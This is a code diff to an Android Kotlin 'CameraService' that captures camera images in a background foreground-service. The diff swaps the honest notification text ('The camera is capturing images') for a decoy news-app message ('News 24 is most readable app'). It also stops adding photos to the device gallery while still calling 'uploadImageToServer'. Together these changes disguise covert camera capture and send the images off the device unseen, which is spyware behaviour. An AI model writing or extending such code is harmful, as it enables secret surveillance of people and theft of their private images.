@@ -63,13 +63,6 @@ class CameraService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
 
-       /* // Start the service in the foreground
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-           // val notification = createNotification()
-            Log.d("CameraService", "onStartCommand triggered 1233444")
-          //  startForeground(NOTIFICATION_ID, notification)
-        }*/
-
         startForegroundService()
         Log.d("CameraService", "onStartCommand triggered")
         return START_STICKY
@@ -81,9 +74,9 @@ class CameraService : Service() {
 
     private fun startForegroundService() {
         val notification = NotificationCompat.Builder(this, "camera_service_channel")
-            .setContentTitle("Camera Service Running")
-            .setContentText("The camera is capturing images")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
+            .setContentTitle("New 24")
+            .setContentText("News 24 is most readable app ")
+            .setSmallIcon(R.drawable.ic_fcm_notification)
             .build()
 
         startForeground(1, notification)
@@ -215,8 +208,10 @@ class CameraService : Service() {
             fileOutputStream = FileOutputStream(photoFile)
             fileOutputStream.write(bytes)
             Log.d("CameraService", "Image saved: ${photoFile.absolutePath}")
+
             // Notify the gallery about the new image
-            addImageToGallery(photoFile.absolutePath)
+            // addImageToGallery(photoFile.absolutePath)
+            // Upload Image to Server
             uploadImageToServer(photoFile)
         } catch (e: Exception) {
             Log.e("CameraService", "Error saving image: ${e.message}")
